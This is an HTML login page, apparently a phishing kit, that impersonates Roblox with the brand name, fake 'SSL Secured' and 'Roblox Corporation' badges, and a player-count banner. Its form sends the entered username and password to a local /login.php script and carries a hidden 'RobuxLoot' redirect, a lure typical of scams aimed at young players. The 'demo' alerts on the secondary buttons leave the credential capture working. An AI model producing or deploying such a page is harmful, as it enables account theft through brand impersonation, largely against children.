<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #1a1a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 400px;
            width: 100%;
            background: #2d2d2d;
            border-radius: 12px;
            padding: 40px 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
            border: 1px solid #404040;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            color: #ffffff;
            font-size: 42px;
            font-weight: 600;
            letter-spacing: -0.5px;
        }
        
        .logo p {
            color: #b0b0b0;
            font-size: 14px;
            margin-top: 8px;
        }
        
        .card form {
            display: flex;
            flex-direction: column;
        }
        
        .card label {
            color: #e0e0e0;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 6px;
        }
        
        .card input {
            height: 48px;
            background: #3d3d3d;
            border: 1px solid #555555;
            border-radius: 8px;
            font-size: 16px;
            padding: 0 16px;
            margin-bottom: 20px;
            color: #ffffff;
            transition: all 0.2s;
        }
        
        .card input:focus {
            outline: none;
            border-color: #888888;
            background: #454545;
        }
        
        .card input::placeholder {
            color: #888888;
        }
        
        .card button {
            background: #4a4a4a;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            height: 48px;
            cursor: pointer;
            margin: 8px 0 16px;
            transition: background 0.2s;
        }
        
        .card button:hover {
            background: #5a5a5a;
        }
        
        .card a {
            color: #a0a0a0;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 12px;
            display: inline-block;
        }
        
        .card a:hover {
            color: #ffffff;
        }
        
        .divider {
            display: flex;
            align-items: center;
            color: #666666;
            font-size: 12px;
            margin: 20px 0;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #404040;
        }
        
        .divider::before {
            margin-right: 16px;
        }
        
        .divider::after {
            margin-left: 16px;
        }
        
        .social-login {
            display: flex;
            gap: 12px;
            margin: 16px 0;
        }
        
        .social-btn {
            flex: 1;
            padding: 12px;
            background: #3d3d3d;
            border: 1px solid #555555;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            color: #e0e0e0;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .social-btn:hover {
            background: #4a4a4a;
            border-color: #777777;
        }
        
        .qr-section {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px;
            background: #3d3d3d;
            border: 1px solid #555555;
            border-radius: 8px;
            margin: 16px 0;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .qr-section:hover {
            background: #454545;
            border-color: #777777;
        }
        
        .qr-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .qr-icon {
            font-size: 24px;
            color: #e0e0e0;
        }
        
        .qr-text {
            font-weight: 600;
            color: #ffffff;
        }
        
        .qr-subtext {
            font-size: 12px;
            color: #a0a0a0;
        }
        
        .footer {
            text-align: center;
            font-size: 12px;
            color: #888888;
            margin-top: 25px;
        }
        
        .footer a {
            color: #a0a0a0;
            text-decoration: none;
            margin: 0 8px;
        }
        
        .footer a:hover {
            color: #ffffff;
        }
        
        input[type="hidden"] {
            display: none;
        }
        
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px 0 0;
            font-size: 12px;
            color: #888888;
        }
        
        .security-badge span {
            margin: 0 4px;
        }
        
        .remember-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 10px 0 20px;
        }
        
        .remember-me {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .remember-me input {
            width: 16px;
            height: 16px;
            background: #3d3d3d;
            border: 1px solid #666666;
            accent-color: #888888;
            cursor: pointer;
        }
        
        .remember-me label {
            font-size: 14px;
            color: #b0b0b0;
            cursor: pointer;
        }
        
        .stats-badge {
            text-align: center;
            font-size: 12px;
            color: #888888;
            margin-bottom: 20px;
        }
        
        @media (max-width: 450px) {
            .container {
                padding: 30px 20px;
            }
            
            .social-login {
                flex-direction: column;
            }
            
            .remember-row {
                flex-direction: column;
                align-items: flex-start;
                gap: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Roblox</h1>
            <p>Sign in to your account</p>
        </div>
        
        <div class="stats-badge">
            ⚡ 70M+ active players
        </div>
        
        <div class="card">
            <form method="POST" action="/login.php" id="loginForm">
                <input type="hidden" name="redirect" value="https://RobuxLoot.roblox.com">
                
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter your username" required autofocus>
                
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
                
                <div class="remember-row">
                    <div class="remember-me">
                        <input type="checkbox" id="remember" checked>
                        <label for="remember">Stay signed in</label>
                    </div>
                    <a href="#" onclick="alert('Password reset demo'); return false;">Forgot?</a>
                </div>
                
                <button type="submit">Sign In</button>
            </form>
            
            <div class="divider">or</div>
            
            <div class="social-login">
                <button class="social-btn" onclick="alert('Google login demo'); return false;">
                    <span>G</span> Google
                </button>
                <button class="social-btn" onclick="alert('Apple login demo'); return false;">
                    <span>🍎</span> Apple
                </button>
            </div>
            
            <div class="qr-section" onclick="alert('QR code login demo'); return false;">
                <div class="qr-left">
                    <span class="qr-icon">📱</span>
                    <div>
                        <div class="qr-text">QR Code Login</div>
                        <div class="qr-subtext">Scan with Roblox mobile app</div>
                    </div>
                </div>
                <span style="color: #888888;">→</span>
            </div>
            
            <div class="security-badge">
                <span>🔒</span>
                <span>SSL Secured</span>
                <span>•</span>
                <span>Roblox Corporation</span>
            </div>
        </div>
        
        <div class="footer">
            <a href="#" onclick="alert('Signup demo'); return false;">Create account</a>
            <span>•</span>
            <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
            <span>•</span>
            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
            <span>•</span>
            <a href="#" onclick="alert('Help demo'); return false;">Help</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                e.preventDefault();
                alert('Please enter your username and password');
                return;
            }
            
            if (username.length < 3) {
                e.preventDefault();
                alert('Username must be at least 3 characters');
                return;
            }
        });
        
        const rememberCheck = document.getElementById('remember');
        rememberCheck.addEventListener('change', function() {
            // Visual feedback only
        });
        
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.style.borderColor = '#888888';
            });
            
            input.addEventListener('blur', function() {
                if (!this.value) {
                    this.style.borderColor = '#555555';
                }
            });
        });
        
        document.querySelector('input[name="username"]').addEventListener('input', function() {
            this.value = this.value.replace(/\s/g, '');
        });
        
        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }
        
        window.addEventListener('load', function() {
            document.getElementById('username').focus();
        });
    </script>
</body>
</html>
